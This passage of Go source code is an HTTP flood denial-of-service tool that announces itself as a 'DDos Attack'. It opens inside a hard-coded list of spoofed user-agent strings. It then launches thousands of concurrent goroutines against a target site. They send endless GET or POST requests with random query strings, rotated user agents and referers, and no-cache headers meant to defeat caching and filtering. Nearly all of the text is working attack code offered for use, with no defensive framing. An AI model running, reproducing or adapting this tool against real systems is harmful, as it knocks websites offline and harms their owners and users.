      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 4.4.3; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
      "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/32.0",
      "Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36",
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 4.2.2; SM-T110 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 6.0.1; LG-K220) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 10; YAL-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 10; ONEPLUS A5000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 9; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 9; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.68",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 YaBrowser/20.8.2.92 Yowser/2.5 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/73.0.3856.344",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
      "Mozilla/5.0 (Linux; arm; Android 10; MOA-LX9N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 YaBrowser/20.11.1.105.00 SA/3 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; arm_64; Android 10; YAL-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 YaBrowser/20.11.3.88.00 SA/3 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.0 Chrome/79.0.3945.136 Mobile Safari/537.36",
	}
	cur int32
)

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func main() {
	var (
		version bool
		site    string
		agents  string
		data    string
		headers arrayFlags
	)

	flag.BoolVar(&version, "version", false, "print version and exit")
	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
	flag.StringVar(&data, "data", "", "Data to POST. If present ddos will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("DDOSMAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		maxproc = 9999
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println("err parsing url parameter\n")
		os.Exit(1)
	}

	if version {
		fmt.Println("DDos", __version__)
		os.Exit(0)
	}

	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
		} else {
			fmt.Printf("can'l load User-Agent list from %s\n", agents)
			os.Exit(1)
		}
	}

	go func() {
		fmt.Println("-- DDos Attack Started --\n           Go!\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("In use               |\tResp OK |\tGot err")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
				atomic.AddInt32(&cur, -1)
				err++
			case callExitOnTooManyFiles:
				atomic.AddInt32(&cur, -1)
				maxproc--
			case callGotOk:
				sent++
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- DDOS Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user --        \n")
}

func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	var param_joiner string
	var client = new(http.Client)

	if strings.ContainsRune(url, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

	for {
		var q *http.Request
		var err error

		if data == "" {
			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		} else {
			q, err = http.NewRequest("POST", url, strings.NewReader(data))
		}

		if err != nil {
			s <- callExitOnErr
			return
		}

		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Charset", acceptCharset)
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", host)

		// Overwrite headers with parameters

		for _, element := range headers {
			words := strings.Split(element, ":")
			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
		}

		r, e := client.Do(q)
		if e != nil {
			fmt.Fprintln(os.Stderr, e.Error())
			if strings.Contains(e.Error(), "socket: too many open files") {
				s <- callExitOnTooManyFiles
				return
			}
			s <- callExitOnErr
			return
		}
		r.Body.Close()
		s <- callGotOk
		if safe {
			if r.StatusCode >= 200 {
				s <- targetComplete
			}
		}
	}
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}
